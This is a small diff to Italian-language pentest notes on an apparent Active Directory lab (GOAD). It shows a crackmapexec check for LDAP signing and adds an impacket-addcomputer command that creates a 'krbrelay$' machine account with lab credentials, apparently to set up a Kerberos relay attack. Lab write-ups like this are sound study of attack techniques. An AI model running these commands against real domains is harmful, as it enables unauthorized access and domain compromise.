@@ -442,3 +442,7 @@ Per utilizzare questo metodo LDAP non deve essere enforced, verificabile con Cra
 crackmapexec ldap 192.168.56.10-12 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M ldap-signing
 ```
 ![[Pasted image 20230906123355.png]]
+Quindi aggiungiamo un nuovo computer al domain
+```bash
+impacket-addcomputer -computer-name 'krbrelay$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
+```
